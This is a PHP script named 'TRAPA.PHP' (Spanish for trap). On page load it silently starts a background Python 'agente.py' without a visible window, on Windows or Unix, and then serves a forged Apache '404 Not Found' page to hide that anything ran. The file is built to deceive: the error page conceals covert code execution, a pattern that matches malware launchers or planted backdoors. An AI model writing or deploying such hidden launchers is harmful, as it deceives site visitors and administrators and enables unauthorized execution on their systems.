<?php
/**
 * TRAPA.PHP - Lanzador Automático
 */

$agente_path = __DIR__ . '/../client/agente.py';

function buscarPython() {
    // Rutas comunes de instalación en Windows
    $posibles_rutas = [
        "python", // Intento global
        "C:\\Python312\\python.exe",
        "C:\\Python311\\python.exe",
        "C:\\Python310\\python.exe",
        "C:\\Python39\\python.exe",
        "C:\\Program Files\\Python312\\python.exe",
        getenv('LOCALAPPDATA') . "\\Programs\\Python\\Python312\\python.exe",
        getenv('LOCALAPPDATA') . "\\Programs\\Python\\Python311\\python.exe",
        getenv('LOCALAPPDATA') . "\\Programs\\Python\\Python310\\python.exe",
        getenv('LOCALAPPDATA') . "\\Programs\\Python\\Python39\\python.exe",
    ];

    foreach ($posibles_rutas as $ruta) {
        // Verificamos si el archivo existe o si el comando responde
        if (file_exists($ruta)) return $ruta;
    }
    return "python"; // Por defecto si no encuentra nada
}

if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    $python = buscarPython();
    // Ejecución en segundo plano sin ventana
    pclose(popen("start /B $python \"$agente_path\"", "r"));
} else {
    exec("python3 \"$agente_path\" > /dev/null 2>&1 &");
}

header("HTTP/1.1 404 Not Found");
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 150px; background: #fff; color: #000; }
        h1 { font-size: 50px; }
        p { font-size: 20px; }
        hr { max-width: 500px; border: 0; border-top: 1px solid #eee; }
    </style>
</head>
<body>
    <h1>404 Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address>Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 Server at localhost Port 80</address>
</body>
</html>
